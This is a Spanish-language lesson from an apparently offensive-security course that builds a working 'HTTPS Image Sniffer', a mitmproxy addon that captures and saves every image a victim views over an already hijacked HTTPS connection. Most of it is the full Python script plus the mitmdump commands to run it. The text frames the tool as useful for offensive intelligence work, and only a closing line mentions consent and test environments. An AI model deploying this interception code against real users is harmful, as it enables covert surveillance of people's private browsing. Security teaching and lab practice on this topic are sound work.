
----
- TAG: #Extracción #Imágenes #Tráfico #HTTPS #Mitmdump 
----
En esta clase, vamos a construir un rastreador de imágenes por HTTPS usando **mitmdump**, conocido como **HTTPS Image Sniffer**. Tras haber establecido una configuración de Man-In-The-Middle (MITM) con mitmdump, el objetivo ahora es desarrollar una herramienta que nos permita capturar y visualizar en tiempo real todas las imágenes que un usuario ve en las páginas web que visita.

Este enfoque se centra en el tráfico de imágenes a través de conexiones HTTPS. Con la máquina víctima ya bajo nuestro control y mitmdump operando como proxy, podremos filtrar y captar específicamente las imágenes, proporcionándonos una visión única de la actividad visual del usuario en la web. Este conocimiento y habilidad práctica son vitales en operaciones ofensivas de ciberseguridad, especialmente en tareas de inteligencia y recolección de información.

---

# Interceptando Imágenes con Python y mitmproxy

En este ejercicio, vamos a interceptar imágenes que se cargan en una página web y guardarlas automáticamente en una carpeta. Para lograr esto, utilizaremos una configuración previa basada en `mitmproxy`, y crearemos un script personalizado llamado `image_sniffer.py`. Aunque existe una herramienta llamada `drifnet` que puede hacer algo similar, en este caso preferimos un enfoque más manual para tener control total sobre lo que hacemos y comprender mejor el proceso.

---

## Requisitos

Antes de empezar, asegúrate de tener lo siguiente:

1. **mitmproxy** instalado. Puedes instalarlo con:
   ```bash
   sudo apt install mitmproxy
   ```

2. Crea una carpeta llamada `images` (o `imagenes` si prefieres) donde se guardarán las imágenes que capturemos de las páginas web.

3. El script `image_sniffer.py` será el que automatice el proceso de interceptación de imágenes. Aquí está el contenido del archivo:

---

## Código: `image_sniffer.py`

```python
#!/usr/bin/python3

# Importamos la biblioteca http de mitmproxy, que nos permite manejar solicitudes HTTP
from mitmproxy import http

# Definimos la función que se ejecutará cada vez que se reciba una respuesta HTTP
def response(packet):
    # Extraemos el encabezado "content-type" de la respuesta HTTP
    content_type = packet.response.headers.get("content-type", "")

    try:
        # Verificamos si el contenido es una imagen
        if "image" in content_type:
            # Obtenemos la URL de la imagen solicitada
            url = packet.request.url
            # Obtenemos la extensión de la imagen desde el content-type (ej. image/jpeg)
            extension = content_type.split("/")[-1]

            # Cambiamos la extensión "jpeg" a "jpg" para una nomenclatura más común
            if extension == "jpeg":
                extension = "jpg"

            # Creamos un nombre de archivo reemplazando caracteres especiales en la URL
            file_name = f"images/{url.replace('/', '_').replace(':', '_')}.{extension}"
            # Extraemos el contenido binario de la imagen
            image_data = packet.response.content

            # Guardamos la imagen en la carpeta "images"
            with open(file_name, "wb") as f:
                f.write(image_data)

            # Imprimimos un mensaje de éxito al guardar la imagen
            print(f"[+] Imagen guardada: {file_name}")

    # En caso de error, no hacemos nada (evitamos que el script falle)
    except:
        pass
```

### Explicación del Script

1. **Importación de `mitmproxy`:**
   Utilizamos la biblioteca `mitmproxy`, que es una herramienta de proxy interactiva que permite interceptar, modificar y analizar el tráfico HTTP/HTTPS.

2. **Función `response`:**
   Esta función es el núcleo del script. Se ejecuta cada vez que se recibe una respuesta HTTP desde el servidor web al cliente. Aquí se interceptan los paquetes para analizar y extraer imágenes.

3. **Obtener el encabezado `content-type`:**
   Verificamos si el tipo de contenido devuelto por el servidor es una imagen (por ejemplo, "image/jpeg", "image/png"). Esto nos asegura que estamos trabajando con archivos de imágenes.

4. **Extraer la extensión del archivo:**
   A partir del `content-type`, obtenemos la extensión del archivo de imagen, como `jpg` o `png`. Si la extensión es `jpeg`, la convertimos a `jpg` para facilitar la nomenclatura de archivos.

5. **Nombre de archivo:**
   Generamos un nombre de archivo basado en la URL de la imagen interceptada, reemplazando caracteres especiales como `/` y `:` con guiones bajos. Esto asegura que el nombre sea válido para el sistema de archivos.

6. **Guardar la imagen:**
   El contenido de la imagen (en formato binario) se guarda en la carpeta `images` que has creado previamente.

7. **Excepciones:**
   Si ocurre algún error (como un problema al guardar el archivo), el script lo ignora para no interrumpir la ejecución. Esto puede incluir errores en la red, falta de permisos para escribir en la carpeta, etc.

---

## Preparando el Entorno

1. **Crea la Carpeta para Guardar Imágenes:**

   Antes de ejecutar el script, asegúrate de tener la carpeta `images` creada en el mismo directorio donde se encuentra tu script.

   ```bash
   mkdir images
   ```

2. **Ejecutando el Script:**

   Una vez que tengas todo configurado, ejecuta el script de la siguiente manera:

   ```bash
   mitmdump -s image_sniffer.py --quiet
   ```

   - **mitmdump**: Es una herramienta CLI de `mitmproxy` que ejecuta el script.
   - **-s**: Opción para cargar y ejecutar el script Python.
   - **--quiet**: Opción para evitar que la salida esté llena de mensajes innecesarios, mostrando solo lo que necesitamos.

---

## Probando el Script

Con el proxy configurado, abre un navegador y navega a una página web que contenga imágenes. Si todo está configurado correctamente, el script interceptará las imágenes que se cargan y las guardará en la carpeta `images`. Cada vez que una imagen sea guardada, verás un mensaje como:

```
[+] Imagen guardada: images/http___example_com_image.jpg
```

---

## Consideraciones

- Este script no intercepta imágenes que ya están almacenadas en caché en el navegador. Si quieres asegurarte de interceptar todas las imágenes, considera desactivar la caché del navegador mientras pruebas el script.
- El proxy de `mitmproxy` debe estar configurado en el navegador o sistema para que todo el tráfico HTTP/HTTPS pase a través de él.
- Ten en cuenta que este tipo de prácticas solo debe realizarse en entornos de pruebas y con el consentimiento de todas las partes involucradas, ya que interceptar tráfico en redes ajenas puede ser ilegal.

---


